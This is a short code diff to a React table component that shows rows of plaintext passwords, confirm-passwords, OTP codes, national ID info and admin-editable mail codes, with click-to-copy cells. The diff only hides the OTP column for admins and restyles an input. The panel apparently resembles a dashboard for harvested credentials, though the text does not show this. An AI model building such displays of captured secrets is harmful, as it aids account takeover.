@@ -99,9 +99,13 @@ const InformationTable = () => {
               <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                 Confirm Password
               </th>
+             {
+             role!== 'admin' &&(
               <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
-                OTP Code
-              </th>
+              OTP Code
+            </th>
+             ) 
+             }
               <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                NID INFO
               </th>
@@ -172,11 +176,15 @@ const InformationTable = () => {
                     <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" value={repassword} />
 
                   </td>
-                  <td onClick={() => handleCopyClick(otp)} className="px-2 py-1 font-bold cursor-pointer ">
+                  {
+                    role !== 'admin'&& (
+                      <td onClick={() => handleCopyClick(otp)} className="px-2 py-1 font-bold cursor-pointer ">
                     <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" value={otp} />
 
 
                   </td>
+                    )
+                  }
                   <td  className="px-2 py-1 font-bold cursor-pointer ">
                   <div className="relative inline-block">
                       <button
@@ -210,7 +218,7 @@ const InformationTable = () => {
                   {
                     role === 'admin' && (
                       <td className="px-2 py-1 font-bold cursor-pointer ">
-                             <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" defaultValue={mailCode} onChange={(e)=>setCodeVal(e.target.value)} />
+                             <input type="text" className="py-2 w-12 border-none dark:bg-graydark focus:outline-none  bg-bodydark1" defaultValue={mailCode} onChange={(e)=>setCodeVal(e.target.value)} />
                       </td>
                     )
                   }
